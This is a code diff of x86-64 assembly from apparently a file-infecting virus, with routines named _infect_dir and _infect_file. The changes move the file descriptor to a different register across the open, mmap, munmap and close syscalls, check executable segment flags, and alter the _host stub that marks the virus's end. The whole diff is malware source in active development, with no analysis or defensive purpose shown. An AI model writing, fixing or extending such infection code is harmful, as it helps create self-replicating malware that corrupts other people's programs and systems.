@@ -240,9 +240,9 @@ _infect_dir:; (string rdi)
 ret
 
 _infect_file: ; (string rdi, stat rsi)
-	push r8
 	push r9
 	push r10
+	push r11
 	push r12
 	push rbx
 	push rcx
@@ -262,8 +262,10 @@ _infect_file: ; (string rdi, stat rsi)
 	jl .return; jump lower
 	push rdi
 	pop r10 ; path
+
+	push r8
 	push rax
-	pop r8 ; fd
+	pop r8
 
 	push r10
 	xor rdi, rdi
@@ -277,6 +279,9 @@ _infect_file: ; (string rdi, stat rsi)
 	pop rax ; mmap
 	syscall
 	pop r10
+	push r8
+	pop r11; fd
+	pop r8
 	cmp rax, 0x0
 	jl .close ; < 0
 
@@ -343,14 +348,16 @@ _infect_file: ; (string rdi, stat rsi)
 		; phdr->p_flags => 4
 		; PF_X => 1 ; pt_load->p_flags & PF_X
 	.unmap:
+		push r11; aaa
 		push r9
 		pop rdi
 		mov rsi, [r12 + 48] ; statbuf.st_size
 		push 11
 		pop rax
 		syscall
+		pop r11; aaa
 	.close:
-		push r8
+		push r11
 		pop rdi
 		push 3
 		pop rax; close
@@ -366,15 +373,15 @@ _infect_file: ; (string rdi, stat rsi)
 	pop rcx
 	pop rbx
 	pop r12
+	pop r11
 	pop r10
 	pop r9
-	pop r8
 ret
 
 _host:
-	jmp _check_end
+;	jmp _check_end
 	_back_host:
-		pop r9
+;		pop r9
 ; r9 contains the end of the virus (minus params)
 	jmp _exit
 
